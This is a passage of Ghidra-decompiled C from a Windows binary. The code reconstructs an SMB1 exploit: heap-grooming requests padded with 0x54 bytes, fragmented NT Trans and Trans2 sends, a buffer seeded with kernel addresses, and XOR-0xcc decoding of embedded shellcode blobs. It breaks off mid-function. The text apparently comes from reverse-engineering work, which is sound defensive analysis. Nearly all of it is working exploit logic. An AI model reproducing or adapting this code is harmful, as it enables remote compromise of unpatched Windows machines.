 * Confidence: MEDIUM (functional interpretation, not original author symbol)
 * API references: none directly identified
 * Direct function references: AllocateZeroedHeapBuffer_10001000, ReleaseTemporaryNetworkBuffer_100020D0, Smb1TransmitRequestBuffer_1000243F, Smb1BuildProtocolHeader_10002466, Smb1BuildTransactionParameterBlock_10002CCF, Smb1ReceiveNetworkReply_1000688F
 */
Smb1ExchangeNtTransaction_1000330E(undefined4 param_1,undefined2 param_2,undefined2 param_3,undefined2 param_4,
            undefined2 param_5,undefined2 param_6,undefined4 param_7,undefined4 *param_8,
            void *param_9,ushort param_10,int *param_11,undefined4 *param_12,undefined2 *param_13)

{
  undefined1 *_Src;
  undefined4 *puVar1;
  void *_Src_00;
  int iVar2;
  void *_Dst;
  uint uVar3;
  undefined4 uVar4;
  undefined4 *puVar5;
  undefined4 *puVar6;
  uint local_8;
  
  local_8 = 0;
  _Src = Smb1BuildTransactionParameterBlock_10002CCF(&local_8,param_7,param_8,param_9,param_10);
  if (_Src != (undefined1 *)0x0) {
    uVar3 = local_8 + 0x24 & 0xffff;
    puVar1 = (undefined4 *)Smb1BuildProtocolHeader_10002466(uVar3,0x32,0xc007,param_2,param_3,param_4,param_5,param_6);
    if (puVar1 != (undefined4 *)0x0) {
      puVar5 = (undefined4 *)AllocateZeroedHeapBuffer_10001000(uVar3);
      if (puVar5 != (undefined4 *)0x0) {
        puVar6 = puVar5;
        for (iVar2 = 9; iVar2 != 0; iVar2 = iVar2 + -1) {
          *puVar6 = *puVar1;
          puVar1 = puVar1 + 1;
          puVar6 = puVar6 + 1;
        }
        memcpy(puVar5 + 9,_Src,local_8 & 0xffff);
        ReleaseTemporaryNetworkBuffer_100020D0();
        ReleaseTemporaryNetworkBuffer_100020D0();
        goto LAB_100033bc;
      }
      ReleaseTemporaryNetworkBuffer_100020D0();
    }
    ReleaseTemporaryNetworkBuffer_100020D0();
  }
  puVar5 = (undefined4 *)0x0;
LAB_100033bc:
  if (puVar5 != (undefined4 *)0x0) {
    *param_11 = *param_11 + (uint)param_10;
    _Src_00 = (void *)AllocateZeroedHeapBuffer_10001000(0x1000);
    if (_Src_00 != (void *)0x0) {
      iVar2 = Smb1ReceiveNetworkReply_1000688F((int)puVar5);
      if ((iVar2 == 0) && (iVar2 = Smb1TransmitRequestBuffer_1000243F(param_1,1), iVar2 == 0)) {
        uVar4 = *(undefined4 *)((int)_Src_00 + 9);
        _Dst = (void *)AllocateZeroedHeapBuffer_10001000(0);
        *param_12 = _Dst;
        if (_Dst == (void *)0x0) {
          uVar4 = 0xffffffff;
        }
        else {
          *param_13 = 0;
          memcpy(_Dst,_Src_00,0);
        }
        ReleaseTemporaryNetworkBuffer_100020D0();
        ReleaseTemporaryNetworkBuffer_100020D0();
        return uVar4;
      }
      ReleaseTemporaryNetworkBuffer_100020D0();
    }
    ReleaseTemporaryNetworkBuffer_100020D0();
  }
  return 0xffffffff;
}



/*
 * RECONSTRUCTED FUNCTION: Smb1ExchangeFragmentedRequest_10003469
 * Ghidra symbol: FUN_10003469 | VA: 0x10003469 | original source line: 3247
 * Confidence: MEDIUM (functional interpretation, not original author symbol)
 * API references: none directly identified
 * Direct function references: AllocateZeroedHeapBuffer_10001000, ReleaseTemporaryNetworkBuffer_100020D0, Smb1TransmitRequestBuffer_1000243F, Smb1BuildProtocolHeader_10002466, Smb1ReceiveNetworkReply_1000688F
 */
int Smb1ExchangeFragmentedRequest_10003469(undefined4 param_1,undefined2 param_2,undefined2 param_3,undefined2 param_4,
                undefined2 param_5,undefined2 param_6,undefined2 param_7,void *param_8,char param_9)

{
  undefined1 *puVar1;
  undefined4 *puVar2;
  int iVar3;
  int iVar4;
  undefined4 *puVar5;
  undefined4 *puVar6;
  size_t local_8;
  
  local_8 = 0;
  if (param_8 == (void *)0x0) {
LAB_10003483:
    _param_7 = (undefined1 *)0x0;
  }
  else {
    local_8 = 0x1015;
    puVar1 = (undefined1 *)AllocateZeroedHeapBuffer_10001000(0x1015);
    if (puVar1 == (undefined1 *)0x0) goto LAB_10003483;
    *(undefined2 *)(puVar1 + 3) = 0x1000;
    *(undefined2 *)(puVar1 + 0xb) = 0x1000;
    *(undefined2 *)(puVar1 + 0xd) = 0x35;
    *(undefined2 *)(puVar1 + 0xf) = param_7;
    *(undefined2 *)(puVar1 + 0x11) = 0;
    *(undefined2 *)(puVar1 + 0x13) = 0x1000;
    *puVar1 = 9;
    memcpy(puVar1 + 0x15,param_8,0x1000);
    _param_7 = puVar1;
  }
  if (_param_7 == (undefined1 *)0x0) {
LAB_100034e1:
    puVar5 = (undefined4 *)0x0;
  }
  else {
    puVar2 = (undefined4 *)
             Smb1BuildProtocolHeader_10002466(local_8 + 0x24,0x33,0xc007,param_2,param_3,param_4,param_5,param_6);
    if (puVar2 == (undefined4 *)0x0) {
LAB_1000351c:
      ReleaseTemporaryNetworkBuffer_100020D0();
      goto LAB_100034e1;
    }
    puVar5 = (undefined4 *)AllocateZeroedHeapBuffer_10001000(local_8 + 0x24);
    if (puVar5 == (undefined4 *)0x0) {
      ReleaseTemporaryNetworkBuffer_100020D0();
      goto LAB_1000351c;
    }
    puVar6 = puVar5;
    for (iVar3 = 9; iVar3 != 0; iVar3 = iVar3 + -1) {
      *puVar6 = *puVar2;
      puVar2 = puVar2 + 1;
      puVar6 = puVar6 + 1;
    }
    memcpy(puVar5 + 9,_param_7,local_8);
    ReleaseTemporaryNetworkBuffer_100020D0();
    ReleaseTemporaryNetworkBuffer_100020D0();
  }
  if (puVar5 == (undefined4 *)0x0) {
LAB_10003575:
    iVar3 = -1;
  }
  else {
    if (param_9 == '\0') {
      iVar3 = Smb1ReceiveNetworkReply_1000688F((int)puVar5);
    }
    else {
      iVar3 = AllocateZeroedHeapBuffer_10001000(0x1000);
      if (iVar3 == 0) {
        ReleaseTemporaryNetworkBuffer_100020D0();
        goto LAB_10003575;
      }
      iVar4 = Smb1ReceiveNetworkReply_1000688F((int)puVar5);
      if ((iVar4 == 0) && (iVar4 = Smb1TransmitRequestBuffer_1000243F(param_1,1), iVar4 == 0)) {
        iVar3 = *(int *)(iVar3 + 9);
        ReleaseTemporaryNetworkBuffer_100020D0();
      }
      else {
        ReleaseTemporaryNetworkBuffer_100020D0();
        iVar3 = -1;
      }
    }
    ReleaseTemporaryNetworkBuffer_100020D0();
  }
  return iVar3;
}



undefined4 __fastcall
/*
 * RECONSTRUCTED FUNCTION: Smb1SendAndReceiveTransactionFragment_100035FA
 * Ghidra symbol: FUN_100035fa | VA: 0x100035FA | original source line: 3337
 * Confidence: MEDIUM (functional interpretation, not original author symbol)
 * API references: none directly identified
 * Direct function references: AllocateZeroedHeapBuffer_10001000, ReleaseTemporaryNetworkBuffer_100020D0, Smb1TransmitRequestBuffer_1000243F, Smb1BuildTransactionRequest_10002C1E, Smb1ReceiveNetworkReply_1000688F
 */
Smb1SendAndReceiveTransactionFragment_100035FA(undefined4 param_1,undefined2 param_2,undefined2 param_3,undefined2 param_4,
            undefined2 param_5,undefined2 param_6,undefined2 param_7,undefined2 param_8,char param_9
            ,char param_10,undefined2 param_11)

{
  undefined4 in_EAX;
  undefined4 *puVar1;
  undefined4 uVar2;
  int iVar3;
  int iVar4;
  ushort local_8 [2];
  
  local_8[0] = 0;
  local_8[1] = 0;
  puVar1 = Smb1BuildTransactionRequest_10002C1E(param_11,param_2,param_3,param_4,param_5,param_6,param_7,param_8,param_9,
                        param_10,local_8);
  if (puVar1 == (undefined4 *)0x0) {
    uVar2 = 0xffffffff;
  }
  else {
    iVar3 = AllocateZeroedHeapBuffer_10001000(0x1000);
    if (iVar3 == 0) {
      ReleaseTemporaryNetworkBuffer_100020D0();
      uVar2 = 0xffffffff;
    }
    else {
      iVar4 = Smb1ReceiveNetworkReply_1000688F((int)puVar1);
      if ((iVar4 == 0) && (iVar4 = Smb1TransmitRequestBuffer_1000243F(in_EAX,1), iVar4 == 0)) {
        uVar2 = *(undefined4 *)(iVar3 + 9);
      }
      else {
        uVar2 = 0xffffffff;
      }
      ReleaseTemporaryNetworkBuffer_100020D0();
      ReleaseTemporaryNetworkBuffer_100020D0();
    }
  }
  return uVar2;
}



undefined4
/*
 * RECONSTRUCTED FUNCTION: Smb1SendAndReceiveEcho_1000369D
 * Ghidra symbol: FUN_1000369d | VA: 0x1000369D | original source line: 3380
 * Confidence: MEDIUM (functional interpretation, not original author symbol)
 * API references: none directly identified
 * Direct function references: AllocateZeroedHeapBuffer_10001000, ReleaseTemporaryNetworkBuffer_100020D0, Smb1TransmitRequestBuffer_1000243F, Smb1BuildEchoRequest_10002620, Smb1ReceiveNetworkReply_1000688F
 */
Smb1SendAndReceiveEcho_1000369D(undefined2 param_1,undefined2 param_2,undefined2 param_3,undefined2 param_4,
            undefined2 param_5)

{
  undefined4 in_EAX;
  undefined4 *puVar1;
  undefined4 uVar2;
  int iVar3;
  int iVar4;
  ushort local_8 [2];
  
  local_8[0] = 0;
  local_8[1] = 0;
  puVar1 = Smb1BuildEchoRequest_10002620(param_1,param_2,param_3,param_4,param_5,local_8);
  if (puVar1 == (undefined4 *)0x0) {
    uVar2 = 0xffffffff;
  }
  else {
    iVar3 = AllocateZeroedHeapBuffer_10001000(0x1000);
    if (iVar3 == 0) {
      ReleaseTemporaryNetworkBuffer_100020D0();
      uVar2 = 0xffffffff;
    }
    else {
      iVar4 = Smb1ReceiveNetworkReply_1000688F((int)puVar1);
      if ((iVar4 == 0) && (iVar4 = Smb1TransmitRequestBuffer_1000243F(in_EAX,1), iVar4 == 0)) {
        uVar2 = *(undefined4 *)(iVar3 + 9);
      }
      else {
        uVar2 = 0xffffffff;
      }
      ReleaseTemporaryNetworkBuffer_100020D0();
      ReleaseTemporaryNetworkBuffer_100020D0();
    }
  }
  return uVar2;
}



// WARNING: Removing unreachable block (ram,0x10003850)

undefined4
/*
 * RECONSTRUCTED FUNCTION: Smb1ExchangeDataBlockVariantA_10003734
 * Ghidra symbol: FUN_10003734 | VA: 0x10003734 | original source line: 3423
 * Confidence: LOW (functional interpretation, not original author symbol)
 * API references: none directly identified
 * Direct function references: AllocateZeroedHeapBuffer_10001000, ReleaseTemporaryNetworkBuffer_100020D0, Smb1TransmitRequestBuffer_1000243F, Smb1BuildProtocolHeader_10002466, Smb1BuildDataBlockVariantA_10002D82, Smb1ReceiveNetworkReply_1000688F
 */
Smb1ExchangeDataBlockVariantA_10003734(undefined4 param_1,undefined2 param_2,undefined2 param_3,undefined2 param_4,
            undefined2 param_5,undefined2 param_6,undefined2 *param_7,char param_8)

{
  void *_Src;
  undefined4 *puVar1;
  int iVar2;
  int iVar3;
  uint uVar4;
  undefined4 *puVar5;
  undefined4 *puVar6;
  undefined4 uVar7;
  uint local_8;
  
  local_8 = 0;
  _Src = (void *)Smb1BuildDataBlockVariantA_10002D82(&local_8,param_8);
  if (_Src != (void *)0x0) {
    uVar4 = local_8 + 0x24 & 0xffff;
    puVar1 = (undefined4 *)Smb1BuildProtocolHeader_10002466(uVar4,0xa2,0xc007,param_2,param_3,param_4,param_5,param_6);
    if (puVar1 != (undefined4 *)0x0) {
      puVar5 = (undefined4 *)AllocateZeroedHeapBuffer_10001000(uVar4);
      if (puVar5 != (undefined4 *)0x0) {
        puVar6 = puVar5;
        for (iVar2 = 9; iVar2 != 0; iVar2 = iVar2 + -1) {
          *puVar6 = *puVar1;
          puVar1 = puVar1 + 1;
          puVar6 = puVar6 + 1;
        }
        memcpy(puVar5 + 9,_Src,local_8 & 0xffff);
        ReleaseTemporaryNetworkBuffer_100020D0();
        ReleaseTemporaryNetworkBuffer_100020D0();
        goto LAB_100037dc;
      }
      ReleaseTemporaryNetworkBuffer_100020D0();
    }
    ReleaseTemporaryNetworkBuffer_100020D0();
  }
  puVar5 = (undefined4 *)0x0;
LAB_100037dc:
  if (puVar5 != (undefined4 *)0x0) {
    iVar2 = AllocateZeroedHeapBuffer_10001000(0x1000);
    if (iVar2 != 0) {
      iVar3 = Smb1ReceiveNetworkReply_1000688F((int)puVar5);
      if ((iVar3 == 0) && (iVar3 = Smb1TransmitRequestBuffer_1000243F(param_1,1), iVar3 == 0)) {
        uVar7 = *(undefined4 *)(iVar2 + 9);
        *param_7 = 0xffff;
      }
      else {
        uVar7 = 0xffffffff;
      }
      ReleaseTemporaryNetworkBuffer_100020D0();
      ReleaseTemporaryNetworkBuffer_100020D0();
      return uVar7;
    }
    ReleaseTemporaryNetworkBuffer_100020D0();
  }
  return 0xffffffff;
}



undefined4
/*
 * RECONSTRUCTED FUNCTION: Smb1ExchangeDataBlockVariantB_10003863
 * Ghidra symbol: FUN_10003863 | VA: 0x10003863 | original source line: 3485
 * Confidence: LOW (functional interpretation, not original author symbol)
 * API references: none directly identified
 * Direct function references: AllocateZeroedHeapBuffer_10001000, ReleaseTemporaryNetworkBuffer_100020D0, Smb1TransmitRequestBuffer_1000243F, Smb1BuildProtocolHeader_10002466, Smb1BuildDataBlockVariantB_10002E30, Smb1ReceiveNetworkReply_1000688F
 */
Smb1ExchangeDataBlockVariantB_10003863(undefined4 param_1,undefined2 param_2,undefined2 param_3,undefined2 param_4,
            undefined2 param_5,undefined2 param_6,undefined2 param_7,char param_8,void *param_9)

{
  char *_Src;
  undefined4 *puVar1;
  int iVar2;
  int iVar3;
  undefined4 *puVar4;
  undefined4 *puVar5;
  undefined4 uVar6;
  
  _Src = Smb1BuildDataBlockVariantB_10002E30(param_8,param_7,param_9);
  if (_Src != (char *)0x0) {
    puVar1 = (undefined4 *)Smb1BuildProtocolHeader_10002466(0x24,0x2f,0xc007,param_2,param_3,param_4,param_5,param_6);
    if (puVar1 != (undefined4 *)0x0) {
      puVar4 = (undefined4 *)AllocateZeroedHeapBuffer_10001000(0x24);
      if (puVar4 != (undefined4 *)0x0) {
        puVar5 = puVar4;
        for (iVar2 = 9; iVar2 != 0; iVar2 = iVar2 + -1) {
          *puVar5 = *puVar1;
          puVar1 = puVar1 + 1;
          puVar5 = puVar5 + 1;
        }
        memcpy(puVar4 + 9,_Src,0);
        ReleaseTemporaryNetworkBuffer_100020D0();
        ReleaseTemporaryNetworkBuffer_100020D0();
        goto LAB_10003916;
      }
      ReleaseTemporaryNetworkBuffer_100020D0();
    }
    ReleaseTemporaryNetworkBuffer_100020D0();
  }
  puVar4 = (undefined4 *)0x0;
LAB_10003916:
  if (puVar4 != (undefined4 *)0x0) {
    iVar2 = AllocateZeroedHeapBuffer_10001000(0x1000);
    if (iVar2 != 0) {
      iVar3 = Smb1ReceiveNetworkReply_1000688F((int)puVar4);
      if ((iVar3 == 0) && (iVar3 = Smb1TransmitRequestBuffer_1000243F(param_1,1), iVar3 == 0)) {
        uVar6 = *(undefined4 *)(iVar2 + 9);
      }
      else {
        uVar6 = 0xffffffff;
      }
      ReleaseTemporaryNetworkBuffer_100020D0();
      ReleaseTemporaryNetworkBuffer_100020D0();
      return uVar6;
    }
    ReleaseTemporaryNetworkBuffer_100020D0();
  }
  return 0xffffffff;
}



/*
 * RECONSTRUCTED FUNCTION: Smb1BuildAndSendLargeTransaction_10003986
 * Ghidra symbol: FUN_10003986 | VA: 0x10003986 | original source line: 3541
 * Confidence: MEDIUM (functional interpretation, not original author symbol)
 * API references: none directly identified
 * Direct function references: AllocateZeroedHeapBuffer_10001000, ReleaseTemporaryNetworkBuffer_100020D0, Smb1TransmitRequestBuffer_1000243F, Smb1BuildProtocolHeader_10002466, Smb1ReceiveNetworkReply_1000688F
 */
int Smb1BuildAndSendLargeTransaction_10003986(undefined4 param_1,undefined2 param_2,undefined2 param_3,undefined2 param_4,
                undefined2 param_5,undefined2 param_6,short param_7,undefined2 param_8,void *param_9
                ,int *param_10,undefined2 *param_11,char param_12)

{
  ushort in_AX;
  undefined1 *puVar1;
  undefined4 *puVar2;
  int iVar3;
  void *_Src;
  int iVar4;
  size_t _Size;
  undefined4 *puVar5;
  uint uVar6;
  undefined4 *puVar7;
  
  _Size = 0;
  if ((in_AX == 0) || (param_9 != (void *)0x0)) {
    _Size = (size_t)(ushort)(in_AX + 0x13);
    puVar1 = (undefined1 *)AllocateZeroedHeapBuffer_10001000(_Size);
    if (puVar1 == (undefined1 *)0x0) {
      _param_7 = (undefined1 *)0x0;
    }
    else {
      *puVar1 = 8;
      *(short *)(puVar1 + 0xb) = param_7;
      if (param_7 != 0) {
        *(undefined2 *)(puVar1 + 0xd) = 0x42;
      }
      *(undefined2 *)(puVar1 + 0xf) = param_8;
      *(ushort *)(puVar1 + 0x11) = in_AX;
      if (in_AX != 0) {
        memcpy(puVar1 + 0x13,param_9,(uint)in_AX);
      }
      _param_7 = puVar1;
    }
  }
  else {
    _param_7 = (undefined1 *)0x0;
  }
  if (_param_7 == (undefined1 *)0x0) {
LAB_10003a04:
    puVar5 = (undefined4 *)0x0;
  }
  else {
    uVar6 = _Size + 0x24 & 0xffff;
    puVar2 = (undefined4 *)Smb1BuildProtocolHeader_10002466(uVar6,0x26,0xc007,param_2,param_3,param_4,param_5,param_6);
    if (puVar2 == (undefined4 *)0x0) {
LAB_10003a3c:
      ReleaseTemporaryNetworkBuffer_100020D0();
      goto LAB_10003a04;
    }
    puVar5 = (undefined4 *)AllocateZeroedHeapBuffer_10001000(uVar6);
    if (puVar5 == (undefined4 *)0x0) {
      ReleaseTemporaryNetworkBuffer_100020D0();
      goto LAB_10003a3c;
    }
    puVar7 = puVar5;
    for (iVar3 = 9; iVar3 != 0; iVar3 = iVar3 + -1) {
      *puVar7 = *puVar2;
      puVar2 = puVar2 + 1;
      puVar7 = puVar7 + 1;
    }
    memcpy(puVar5 + 9,_param_7,_Size);
    ReleaseTemporaryNetworkBuffer_100020D0();
    ReleaseTemporaryNetworkBuffer_100020D0();
  }
  if (puVar5 == (undefined4 *)0x0) {
LAB_10003a94:
    iVar3 = -1;
  }
  else {
    if (param_12 == '\0') {
      iVar3 = Smb1ReceiveNetworkReply_1000688F((int)puVar5);
      *param_10 = 0;
      *param_11 = 0;
    }
    else {
      _Src = (void *)AllocateZeroedHeapBuffer_10001000(0x1000);
      if (_Src == (void *)0x0) {
        ReleaseTemporaryNetworkBuffer_100020D0();
        goto LAB_10003a94;
      }
      iVar3 = Smb1ReceiveNetworkReply_1000688F((int)puVar5);
      if ((iVar3 == 0) && (iVar3 = Smb1TransmitRequestBuffer_1000243F(param_1,1), iVar3 == 0)) {
        iVar3 = *(int *)((int)_Src + 9);
        iVar4 = AllocateZeroedHeapBuffer_10001000(0);
        *param_10 = iVar4;
        if (iVar4 == 0) {
          iVar3 = -1;
        }
        else {
          *param_11 = 0;
          memcpy((void *)*param_10,_Src,0);
        }
        ReleaseTemporaryNetworkBuffer_100020D0();
      }
      else {
        ReleaseTemporaryNetworkBuffer_100020D0();
        iVar3 = -1;
      }
    }
    ReleaseTemporaryNetworkBuffer_100020D0();
  }
  return iVar3;
}



undefined4
/*
 * RECONSTRUCTED FUNCTION: Smb1ProbeTransactionVariantA_10003B5D
 * Ghidra symbol: FUN_10003b5d | VA: 0x10003B5D | original source line: 3651
 * Confidence: LOW (functional interpretation, not original author symbol)
 * API references: none directly identified
 * Direct function references: AllocateZeroedHeapBuffer_10001000, ReleaseTemporaryNetworkBuffer_100020D0, Smb1ExchangeFragmentedRequest_10003469, Smb1SendAndReceiveEcho_1000369D
 */
Smb1ProbeTransactionVariantA_10003B5D(undefined4 param_1,undefined2 param_2,undefined2 param_3,undefined2 param_4,
            undefined2 param_5,undefined2 param_6)

{
  void *pvVar1;
  undefined4 uVar2;
  int iVar3;
  short sVar4;
  int local_8;
  
  pvVar1 = (void *)AllocateZeroedHeapBuffer_10001000(0xf000);
  if (pvVar1 == (void *)0x0) {
    uVar2 = 0xffffffff;
  }
  else {
    *(undefined4 *)((int)pvVar1 + 0x807) = 0x3668f383;
    memset((void *)((int)pvVar1 + 0x80b),0x54,0xe7f4);
    local_8 = 0;
    sVar4 = 0x3d0;
    do {
      iVar3 = Smb1ExchangeFragmentedRequest_10003469(param_1,param_2,param_3,param_4,param_5,param_6,sVar4,pvVar1,'\0');
      if (iVar3 != 0) {
        ReleaseTemporaryNetworkBuffer_100020D0();
        return 0xffffffff;
      }
      sVar4 = sVar4 + 0x1000;
      local_8 = local_8 + 1;
      pvVar1 = (void *)((int)pvVar1 + 0x1000);
    } while (local_8 < 0xf);
    ReleaseTemporaryNetworkBuffer_100020D0();
    uVar2 = Smb1SendAndReceiveEcho_1000369D(param_2,param_3,param_4,param_5,param_6);
  }
  return uVar2;
}



/*
 * RECONSTRUCTED FUNCTION: Smb1ProbeTransactionVariantB_10003C0A
 * Ghidra symbol: FUN_10003c0a | VA: 0x10003C0A | original source line: 3688
 * Confidence: LOW (functional interpretation, not original author symbol)
 * API references: none directly identified
 * Direct function references: AllocateZeroedHeapBuffer_10001000, ReleaseTemporaryNetworkBuffer_100020D0, Smb1ExchangeFragmentedRequest_10003469
 */
int Smb1ProbeTransactionVariantB_10003C0A(undefined4 param_1,undefined2 param_2,undefined2 param_3,undefined2 param_4,
                undefined2 param_5,undefined2 param_6)

{
  void *_Dst;
  int iVar1;
  uint uVar2;
  
  _Dst = (void *)AllocateZeroedHeapBuffer_10001000(0x1000);
  if (_Dst == (void *)0x0) {
    iVar1 = -1;
  }
  else {
    memset(_Dst,0x54,0xb8c);
    uVar2 = 0;
    do {
      *(undefined1 *)((int)_Dst + uVar2 + 0xb8c) = (&DAT_10010b08)[uVar2];
      uVar2 = uVar2 + 1;
    } while (uVar2 < 0xaf);
    memset((void *)((int)_Dst + 0xc3b),0x54,0x3c5);
    iVar1 = Smb1ExchangeFragmentedRequest_10003469(param_1,param_2,param_3,param_4,param_5,param_6,0xf3d0,_Dst,'\x01');
    if (iVar1 == -0x3ffffff3) {
      iVar1 = 0;
    }
    ReleaseTemporaryNetworkBuffer_100020D0();
  }
  return iVar1;
}



/*
 * RECONSTRUCTED FUNCTION: Smb1PrepareComplexTransaction_10003CA0
 * Ghidra symbol: FUN_10003ca0 | VA: 0x10003CA0 | original source line: 3719
 * Confidence: MEDIUM (functional interpretation, not original author symbol)
 * API references: none directly identified
 * Direct function references: AllocateZeroedHeapBuffer_10001000, GetTickCounterLowWord_100020B2, ReleaseTemporaryNetworkBuffer_100020D0, Smb1ReceiveNetworkReply_1000688F
 */
int Smb1PrepareComplexTransaction_10003CA0(void)

{
  char in_AL;
  byte *pbVar1;
  int iVar2;
  uint uVar3;
  byte *pbVar4;
  SIZE_T local_8;
  
  local_8 = 0;
  if (in_AL == '\0') {
    local_8 = 0x84;
  }
  if (in_AL == '\x01') {
    local_8 = 0xb68;
  }
  if (in_AL == '\x02') {
    local_8 = 0x480;
  }
  pbVar1 = (byte *)AllocateZeroedHeapBuffer_10001000(local_8);
  if (pbVar1 == (byte *)0x0) {
    iVar2 = -1;
  }
  else {
    if (in_AL == '\0') {
      pbVar1[2] = 0xff;
      pbVar1[3] = 0xf7;
      uVar3 = GetTickCounterLowWord_100020B2();
      *(short *)(pbVar1 + 4) = (short)uVar3;
      uVar3 = GetTickCounterLowWord_100020B2();
      *(short *)(pbVar1 + 6) = (short)uVar3;
    }
    if (in_AL == '\x01') {
      pbVar1[8] = 3;
      pbVar1[0x28] = 3;
      pbVar1[0xa0] = 0xb0;
      pbVar1[0xa1] = 0;
      pbVar1[0xa2] = 0xd0;
      pbVar1[0xa3] = 0xff;
      pbVar1[0xa4] = 0xff;
      pbVar1[0xa5] = 0xff;
      pbVar1[0xa6] = 0xff;
      pbVar1[0xa7] = 0xff;
      pbVar1[0xa8] = 0xb0;
      pbVar1[0xa9] = 0;
      pbVar1[0xaa] = 0xd0;
      pbVar1[0xab] = 0xff;
      pbVar1[0xac] = 0xff;
      pbVar1[0xad] = 0xff;
      pbVar1[0xae] = 0xff;
      pbVar1[0xaf] = 0xff;
      *(void ***)(pbVar1 + 0xc0) = &WOW32Reserved;
      *(void ***)(pbVar1 + 0xc4) = &WOW32Reserved;
      pbVar1[0x18c] = 0x90;
      pbVar1[0x18d] = 0xf1;
      pbVar1[0x18e] = 0xdf;
      pbVar1[399] = 0xff;
      *(undefined **)(pbVar1 + 0x194) = &DAT_ffdff1f0;
      pbVar1[0x1d8] = 0xf0;
      pbVar1[0x1d9] = 1;
      pbVar1[0x1da] = 0xd0;
      pbVar1[0x1db] = 0xff;
      pbVar1[0x1dc] = 0xff;
      pbVar1[0x1dd] = 0xff;
      pbVar1[0x1de] = 0xff;
      pbVar1[0x1df] = 0xff;
      pbVar1[0x1e8] = 0;
      pbVar1[0x1e9] = 2;
      pbVar1[0x1ea] = 0xd0;
      pbVar1[0x1eb] = 0xff;
      pbVar1[0x1ec] = 0xff;
      pbVar1[0x1ed] = 0xff;
      pbVar1[0x1ee] = 0xff;
      pbVar1[0x1ef] = 0xff;
      uVar3 = 0;
      do {
        pbVar1[uVar3 + 0x1f1] = (&DAT_100123b0)[uVar3] ^ 0xcc;
        uVar3 = uVar3 + 1;
      } while (uVar3 < 0x977);
    }
    if (in_AL == '\x02') {
      iVar2 = 0x47b;
      pbVar4 = pbVar1;
      do {
        *pbVar4 = pbVar4[(int)&DAT_10012d27 - (int)pbVar1] ^ 0xcc;
        pbVar4 = pbVar4 + 1;
        iVar2 = iVar2 + -1;
      } while (iVar2 != 0);
    }
    iVar2 = Smb1ReceiveNetworkReply_1000688F((int)pbVar1);
    ReleaseTemporaryNetworkBuffer_100020D0();
  }
  return iVar2;
}



/*
 * RECONSTRUCTED FUNCTION: Smb1WriteTransactionFragments_10003DD7
 * Ghidra symbol: FUN_10003dd7 | VA: 0x10003DD7 | original source line: 3817
 * Confidence: MEDIUM (functional interpretation, not original author symbol)
 * API references: none directly identified
 * Direct function references: AllocateZeroedHeapBuffer_10001000, ReleaseTemporaryNetworkBuffer_100020D0, Smb1ExchangeNtTransaction_1000330E
 */
int Smb1WriteTransactionFragments_10003DD7(undefined4 param_1,undefined2 param_2,undefined2 param_3,undefined2 param_4,
                undefined2 param_5,short param_6,undefined4 param_7,ushort param_8,int param_9,
                undefined4 param_10,int param_11,int *param_12)

{
  short sVar1;
  int iVar2;
  undefined4 *puVar3;
  uint uVar4;
  uint uVar5;
  undefined4 uStack_14;
  undefined1 uStack_10;
  SIZE_T local_c;
  undefined4 *local_8;
  
  if (param_9 == 0) {
    iVar2 = -1;
  }
  else {
    local_c = param_8 + 0xc;
    puVar3 = (undefined4 *)AllocateZeroedHeapBuffer_10001000(local_c);
    *puVar3 = param_10;
    iVar2 = *param_12;
    *(ushort *)(puVar3 + 1) = param_8;
    puVar3[2] = iVar2;
    local_8 = puVar3;
    memcpy(puVar3 + 3,(void *)(param_9 + param_11),(uint)param_8);
    uStack_10 = 0;
    uVar4 = 0;
    uStack_14 = param_7;
    do {
      uVar5 = uVar4 & 0x80000003;
      if ((int)uVar5 < 0) {
        uVar5 = (uVar5 - 1 | 0xfffffffc) + 1;
      }
      *(byte *)(uVar4 + (int)puVar3) =
           *(byte *)(uVar4 + (int)puVar3) ^ *(byte *)((int)&uStack_14 + uVar5);
      uVar4 = uVar4 + 1;
    } while ((int)uVar4 < (int)local_c);
    param_10 = 0;
    param_9 = 0;
    iVar2 = Smb1ExchangeNtTransaction_1000330E(param_1,param_2,param_3,param_4,param_5,param_6 + 1,0xf2,puVar3,puVar3 + 3,
                         param_8,param_12,&param_9,(undefined2 *)&param_10);
    if (iVar2 == -1) {
      ReleaseTemporaryNetworkBuffer_100020D0();
      ReleaseTemporaryNetworkBuffer_100020D0();
      iVar2 = -1;
    }
    else {
      ReleaseTemporaryNetworkBuffer_100020D0();
      sVar1 = *(short *)(param_9 + 0x1a);
      ReleaseTemporaryNetworkBuffer_100020D0();
      iVar2 = (sVar1 == 0x11) - 1;
    }
  }
  return iVar2;
}



undefined4
/*
 * RECONSTRUCTED FUNCTION: Smb1RunFragmentedTransactionSequence_10003EC8
 * Ghidra symbol: FUN_10003ec8 | VA: 0x10003EC8 | original source line: 3878
 * Confidence: MEDIUM (functional interpretation, not original author symbol)
 * API references: none directly identified
 * Direct function references: AllocateZeroedHeapBuffer_10001000, ReleaseTemporaryNetworkBuffer_100020D0, Smb1SendAndReceiveTransactionFragment_100035FA, Smb1ExchangeDataBlockVariantA_10003734, Smb1ExchangeDataBlockVariantB_10003863
 */
Smb1RunFragmentedTransactionSequence_10003EC8(undefined4 param_1,undefined2 param_2,undefined2 param_3,undefined2 param_4,
            undefined2 param_5,undefined2 param_6,undefined2 *param_7)

{
  byte bVar1;
  byte *in_EAX;
  int iVar2;
  SIZE_T SVar3;
  undefined4 *puVar4;
  int iVar5;
  undefined4 uVar6;
  undefined4 extraout_ECX;
  uint local_8;
  
  *in_EAX = 0;
  while( true ) {
    iVar2 = Smb1ExchangeDataBlockVariantA_10003734(param_1,param_2,param_3,param_4,param_5,param_6,param_7,*in_EAX);
    if (iVar2 == -1) {
      return 0xffffffff;
    }
    if (iVar2 == 0) break;
    *in_EAX = *in_EAX + 1;
    if (1 < *in_EAX) {
      return 0xffffffff;
    }
  }
  iVar2 = Smb1SendAndReceiveTransactionFragment_100035FA(extraout_ECX,0x54,0xc007,param_2,param_3,param_4,param_5,param_6,'\x03',
                       *in_EAX,*param_7);
  if (iVar2 != 0) {
    return 0xffffffff;
  }
  local_8 = 0;
  if (*in_EAX == 0) {
    local_8 = 0x48;
  }
  if (*in_EAX == 1) {
    local_8 = 0x38;
  }
  SVar3 = local_8 + 0x420;
  puVar4 = (undefined4 *)AllocateZeroedHeapBuffer_10001000(SVar3);
  if (puVar4 == (undefined4 *)0x0) {
    return 0xffffffff;
  }
  bVar1 = *in_EAX;
  if (bVar1 == 0) {
    *puVar4 = 0x3000005;
    puVar4[1] = 0x10;
    puVar4[2] = SVar3;
    puVar4[3] = 1;
    puVar4[4] = 0x450;
    puVar4[5] = 0x2d0000;
